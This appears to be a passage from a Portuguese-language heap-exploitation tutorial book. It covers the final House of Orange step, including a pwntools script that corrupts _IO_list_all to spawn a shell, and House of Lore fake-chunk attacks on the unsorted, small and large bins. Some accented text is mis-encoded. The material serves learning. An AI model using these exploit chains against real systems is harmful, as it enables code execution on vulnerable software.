<p>Como o ataque nos unsorted bins ira causar um <code>abort</code>, ja precisamos preparar 
os dois ao mesmo tempo, criando a <code>file stream</code> falsa no chunk que tamb√©m 
usamos para o unsorted bins.</p>
<pre><code class="language-py">edit(flat(
    libc.sym.system,# vtable + 0x18
    0,#                         IO_list_all | Unsorted Bin
    b&quot;/bin/sh\0&quot;,#                    flags |
    0x60 + 1,#                              | size
    0,#                                     | fd
    libc.sym._IO_list_all - 16,#            | bk (alvo)
    1,#                          write base | 
    2,#                          write ptr  |
    '\0'*8*21,
    heap - 8,#                       vtable |
))
</code></pre>
<p>E o heap fica:</p>
<pre><code class="language-x86asm">0x5653aa00f000  0x0000000000000000  0x0000000000000021   &lt;-- Vuln Chunk
0x5653aa00f010  0x00007f094febf830  0x0000000000000000  
0x5653aa00f020  0x0068732f6e69622f  0x0000000000000061   &lt;-- unsortedbin[all][0]
0x5653aa00f030  0x0000000000000000  0x00007f095021a510
0x5653aa00f040  0x0000000000000001  0x0000000000000002
0x5653aa00f050  0x0000000000000000  0x0000000000000000
0x5653aa00f060  0x0000000000000000  0x0000000000000000
0x5653aa00f070  0x0000000000000000  0x0000000000000000

O pwndbg somente le ate aqui, mas lembrando que tem aqueles 900 zeros seguido dos fenceposts
</code></pre>
<p>Ou simplificando</p>
<pre><code class="language-x86asm">0x0000000000000000  0x0000000000000021      &lt;-- Vuln Chunk
      SYSTEM        0x0000000000000000 &lt;- vtable+0x18
     /bin/sh                SIZE            &lt;-- unsortedbin[all][0]
0x0000000000000000      _IO_list_all   &lt;- Unsorted: BK
     write_base          write_ptr     
0x0000000000000000  0x0000000000000000
0x0000000000000000  0x0000000000000000
0x0000000000000000  0x0000000000000000
...
...
Algum lugar aqui o Vtable pointer
...
...
Fenceposts
</code></pre>
<p>Agora basta um malloc para fazer o unsorted chunk sofrer <strong>SORT</strong> e acionar nosso 
ataque...</p>
<p>Como o <code>abort</code> chegou a ser chamado, um backtrace, mapa da memoria, etcetc sera 
printado, para dar uma vibe mais polida para o exploit basta adicionar:</p>
<pre><code>io.recvuntil(&quot;[vdso]\n&quot;)
io.interactive()
</code></pre>
<p>Lembrando que por culpa do ataque no _IO_list_all, essa t√©cnica so te da uma shell
50% das vezes!</p>
<p>Caso voce queira, voce pode colocar o ataque todo dentro de <code>main()</code> e fazer:</p>
<pre><code class="language-py">while True:
    try: 
        main()
    except:
        continue
    quit()
</code></pre>
<p>Assim temos:</p>
<pre><code class="language-py">def main():
  #################################
  #          Inicializar          #
  #################################

  # elf = ELF( alvo123 )
  # io = process(elf.path)
  # libc = elf.libc

  #################################
  #        Heap libc Leak        #
  #################################

  # heap = bla bla bla
  # libc.address = bla bla bla

  #################################
  #        House Of Orange        #
  #################################
  # Extender Heap
  usado = 0x20 # Quanto do heap ja foi usado, por exemplo 0xa0, 0xc0,...
  edit_vuln(flat(
    0,
    0,
    0,
    0x1000 - usado + 1  
  ))
  malloc_grande()
  # Unsorted + _IO_list_all
  edit(flat(
      libc.sym.system,# vtable + 0x18
      0,#                         IO_list_all | Unsorted Bin
      b&quot;/bin/sh\0&quot;,#                    flags |
      0x60 + 1,#                              | size
      0,#                                     | fd
      libc.sym._IO_list_all - 16,#            | bk (alvo)
      1,#                          write base | 
      2,#                          write ptr  |
      '\0'*8*21,
      heap - 8,#                       vtable |
  ))

  # Qualquer malloc agora acionaria o sort
  malloc_grande()
  io.recvuntil(&quot;[vdso]\n&quot;)
  io.interactive()


while True:
    try: 
        main()
    except:
        continue
    quit()
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="house-of-lore"><a class="header" href="#house-of-lore">House of Lore</a></h1>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#house-of-lore">House of Lore</a></li>
<li><a href="heap/malloc/HouseOfLore.html#unsortedbin">UnsortedBin</a>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#ataque">Ataque</a></li>
<li><a href="heap/malloc/HouseOfLore.html#obs">Obs</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfLore.html#small-bins">Small Bins</a>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#obs-1">Obs</a></li>
</ul>
</li>
<li><a href="heap/malloc/HouseOfLore.html#large-bins">Large bins</a>
<ul>
<li><a href="heap/malloc/HouseOfLore.html#bk_nextsize">bk_nextsize</a></li>
</ul>
</li>
</ul>
<p>Na house of Lore vamos colocar um chunk falso no UnsortedBin, SmallBins ou LargeBins.</p>
<p>Porem, nao iremos chamar <code>free()</code> no chunk falso (como na House 
of Spirit) ou um double free (como no fastbin dup).</p>
<p>Esse foi um dos ataques originais do malloc malleficarium</p>
<p>Ele busca alocar o chunk falso em uma area com infirma√ß√µes sens√≠veis do 
programa e altera-las</p>
<h1 id="unsortedbin"><a class="header" href="#unsortedbin">UnsortedBin</a></h1>
<blockquote>
<p>Vers√£o &lt; 2.29
Para a HoL nos unsortedbins, precisamos de um <code>write-after-free</code> em um chunk 
dos unsorted bins.... Seja isso por meio de um overflow, ou o programa 
permitindo alterar chunks livres...</p>
</blockquote>
<p>Isso deve te lembrar do Partial Unlink nos Unsorted Bins e da House of Orange.
Porem, nesses casos a parte importante era o write na hora da aloca√ß√£o, e nao 
a aloca√ß√£o em si, com na HoO ate usando o crash mitiga√ß√£o nessa aloca√ß√£o ao
nosso favor.</p>
<p>Porem neses caso, nos queremos que o chunk seja us√°vel quando nos alocamos e 
que o programa nao crash... ent√£o precisaremos mudar um pouco a estrategia ...</p>
<h2 id="ataque-2"><a class="header" href="#ataque-2">Ataque</a></h2>
<p>Nos podemos usar o UAF no chunk do heap para alterar o bk, da mesma maneira que 
far√≠amos com o ataque dos unsortedbins...</p>
<p>Assim, vamos supor que o chunk falso sera criado no <code>username</code> (armazenado na 
<code>data</code> section)</p>
<pre><code class="language-py">change_username(flat(
    0,
    0xc1,# size
    0,#fd
    0,#bk
)) 

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))
</code></pre>
<p>Assim, o unsorted bin fica:</p>
<blockquote>
<p>head bk: chunk_A -&gt; username -&gt; 0 
Em seguida, nos poder√≠amos alocar o chunk_A e sem seguida o nosso chunk falso</p>
</blockquote>
<p>Porem, durante a aloca√ß√£o desses chunks, um ataque do unsorted bin acidental 
ocorreria, ok se mostra ok no caso do chunk_A, pois aponta para memoria valida 
( a data section aonde o chunk falso fica)</p>
<p>Entretanto, no caso do chunk falso, ele tentaria fazer um ataque dos 
unsortedbins em <code>0 + 0x10</code>, memoria invalida: SEGFAULT!!!!</p>
<p>Assim, nos precisamos garantir que o bk do chunk falso aponta para memoria 
escrev√≠vel! A solu√ß√£o mais f√°cil √© aponta-lo para ele mesmo, corrompendo os 
8 bytes in√∫teis antes do size</p>
<pre><code class="language-py">change_username(flat(
    0,
    0xc1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 
</code></pre>
<p>Agora basta realizar um malloc com o size do chunk falso, e 
pronto! Nos temos um chunk na data section (ou aonde vc criou o 
chunk falso)</p>
<pre><code class="language-py">free(chunk_A)

change_username(flat(
    0,
    0xc1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
))  

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))

chunk_FAKE = malloc(0xb8)
</code></pre>
<h2 id="obs"><a class="header" href="#obs">Obs</a></h2>
<p>Como nos controlamos o bk do chunk falso, podemos apontar para outro chunk 
falso, ou ate pra ele mesmo contanto que voce nao danifique o bk entre 
aloca√ß√µes :D</p>
<p>Voce pode ter pode ter a 8 flag acidentalmente ligada que nao interfere</p>
<p>O size precisa &lt; do que system_mem</p>
<p>o bk do chunk falso precisa apontar para memoria escrev√≠vel</p>
<p>Quando tentar encontrar sizes que ocorrem naturalmente, eles PODEM nao estar 
alinhados</p>
<h1 id="small-bins-1"><a class="header" href="#small-bins-1">Small Bins</a></h1>
<p>O ataque contra os smalls bins √© bem semelhante ao dos unsorted 
bins, porem nos precisamos que antes do UAF para corromper os 
pointers, nos coloquemos (sort) o chunk no small bins...</p>
<p>Para isto basta executar um malloc que nao o aloque... por 
exemplo, caso o seu chunk seja de size <code>0xb0</code>, basta alocar um de 
tamanho &gt;= <code>0xc0</code></p>
<blockquote>
<p>Lembrando que tem outros m√©todos de dar SORT no chunk, 
explicados na parte de teoria</p>
</blockquote>
<p>Assim o UAF, ira corromper meta dados de smallbin, e nao de 
unsortedbin :D</p>
<p>Os small bins tamb√©m usam um parcial unlink, ent√£o nos podemos 
ignorar o fd</p>
<pre><code class="language-py">change_username(flat(
    0,
    0xb1,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))
</code></pre>
<p>Por conta de de os small bins nao terem verifica√ß√£o no tamanho do 
chunk, voce pode colocar qualquer valor....</p>
<pre><code class="language-py">chunk_A = malloc(0x98)
malloc(0x18) #  Previvir consolida√ß√£o com o TOP

free(chunk_A)

change_username(flat(
    0,
    0x00,# size
    0,#fd
    elf.sym.username - 0x10,#bk
)) 

malloc( TAMANHO DIFERENTE DO CHUNK_A ) # sort chunk_A -&gt; Small

edit_chunk_A(flat(
    0,# fd
    elf.sym.username
))

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
</code></pre>
<p>Lembrando que o bk do chunk_fake ainda precisa apontar para 
memoria valida e que o voce precisa de um chunk APOS o do UAF para evitar 
consolida√ß√£o com o top chunk.</p>
<p>Por ultimo, temos que enfrentar a mitiga√ß√£o do partial unlink duas 
vezes: quando alocar o chunk_fake e quando alocar o chunk_A </p>
<ul>
<li>o chunk_fake.fd precisa apontar para o chunk_A: chunk_A.bk -&gt; 
chunk_fake.fd -&gt; chunk_A</li>
<li>o chunk_fake.bk + 0x10 precisa apontar para o chunk_fake</li>
</ul>
<p>Assim, nos precisaremos de um heap leak do endere√ßo do chunk_A !</p>
<pre><code class="language-py">change_username(flat(
    elf.sym.username,
    0x00,# size
    leak_chunk_A,#fd
    elf.sym.username - 0x10,#bk
)) 
</code></pre>
<p>e pronto! alocamos um chunk falso :D</p>
<h2 id="obs-1"><a class="header" href="#obs-1">Obs</a></h2>
<p>Mais dif√≠cil que o unsorted bins</p>
<p>Precisa de heap leak</p>
<p>Nao precisa ficar alinhado</p>
<p>Nao precisa de size correto</p>
<p>Pode fazer o mesmo coiso de apontar o bk do chunk_fake para outro 
chunk falso e assim por diante...</p>
<h1 id="large-bins-1"><a class="header" href="#large-bins-1">Large bins</a></h1>
<p>Para os largebins, podemos tanto atacar um skipchunk quanto um normal, 
portanto a diferen√ßa √© que para skipchunks, vamos corromper o <code>bk_nextsize</code> e 
para os normais o <code>fd</code></p>
<p>Vamos come√ßar pelos normais</p>
<p>Por ser um safe unlink, nosso chunk precisara passar pelos checks 
relacionados.</p>
<p>Alem disso malloc checa se <code>size == fd-&gt;size</code>, ent√£o o chunk falso e o chunk 
do UAF precisam ter o mesmo tamanho e possuir as mesmas flags (ex: 0x401)! 
(macro: <code>CHUNKSIZE_NOMASK</code>)</p>
<ul>
<li>fake size = uaf size</li>
<li>fd e bk validos safe unlink
<ul>
<li>chunk.fd.bk -&gt; chunk</li>
<li>chunk.bk.fd -&gt; chunk</li>
<li>Basta colocar os 2 como o endere√ßo do chunk falso </li>
</ul>
</li>
<li>fd_nextsize = 0
<ul>
<li>se ele for NULL, o chunk <strong>NAO</strong> sera considerado skip </li>
<li>se fd_nextsize != 0 e GLIBC &gt; 2.21:</li>
<li>fd_nextsize e bk_nextsize precisariam passar safe unlink</li>
</ul>
</li>
<li>E por ultimo, o chunk do UAF nao pode ser o ultimo do largebin</li>
</ul>
<p>Seguindo o exemplo do user:</p>
<pre><code class="language-py">chunk_A = malloc(0x3f8)
malloc(0x18) # Previvir consolida√ß√£o A B
chunk_B = malloc(0x3f8)
malloc(0x18) #  Previvir consolida√ß√£o B TOP

free(chunk_A)
free(chunk_B)

change_username(flat(
    0,
    0x401,#size
    elf.sym.username,#fd
    elf.sym.username,#bk
    0,#fd_nextsize
    0,#bk_nextsize
)) 

malloc( 0x418 ) # sort chunk_A -&gt; large 0x400

edit_chunk_A(p64(elf.sym.username))# UAF Corromper fd

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
</code></pre>
<h2 id="bk_nextsize"><a class="header" href="#bk_nextsize">bk_nextsize</a></h2>
<p>Agora, para fazer o mesmo ataque por meio do <code>bk_nextsize</code>, basta trocar por:</p>
<pre><code class="language-py">edit_chunk_A(flat(0,0,0,elf.sym.username))# UAF Corromper bk_nextsize
</code></pre>
<p>Uma vantagem, √© que o chunk falso, por se assumir a opera√ß√£o de remainder, pode
ter um tamanho menor (ou ate mesmo MAIOR) que o chunk do UAF</p>
<p>Alem disso, nao precisamos do chunk_B, com o chunk do UAF podendo ser o ultimo.</p>
<pre><code class="language-py">chunk_A = malloc(0x3f8)
malloc(0x18) # Previvir consolida√ß√£o A B
chunk_B = malloc(0x3f8)
malloc(0x18) #  Previvir consolida√ß√£o B TOP

free(chunk_A)
free(chunk_B)

change_username(flat(
    0,
    0x501,#size
    elf.sym.username,#fd
    elf.sym.username,#bk
    0,#fd_nextsize
    0,#bk_nextsize
)) 

malloc( 0x418 ) # sort chunk_A -&gt; large 0x400

edit_chunk_A(flat(0,0,0,elf.sym.username))# UAF Corromper bk_nextsize

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-internals"><a class="header" href="#linux-internals">Linux Internals</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="prerequisitos"><a class="header" href="#prerequisitos">Prerequisitos</a></h1>
<p>Tanto coisas que eu ja comentei nesse livrinho quanto coisas que deu pregui√ßa..
. hehe</p>
<ul>
<li>Loader, Linker, GOT e PLT
<ul>
<li><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/">Anatomy of a program in memory</a></li>
<li><a href="https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/11/10/understanding-the-loader-part1-how-does-an-executable-get-loaded-to-memory.html">Understanding the Loader - Part1</a></li>
<li><a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT - the key to code sharing and dynamic libraries</a></li>
</ul>
</li>
<li>Syscalls
<ul>
<li><a href="https://man7.org/linux/man-pages/man2/syscall.2.html">man syscalls</a> </li>
<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md">Em arquiteturas comuns</a></li>
</ul>
</li>
<li>Signals e Processos
<ul>
<li><a href="https://www.win.tue.nl/%7Eaeb/linux/lk/lk-5.html">The Linux kernel: Signals</a></li>
<li><a href="https://linoxide.com/how-tos/signal-handling-linux-signal-function/">Signal Handling In Linux Through The signal() Function</a></li>
</ul>
</li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
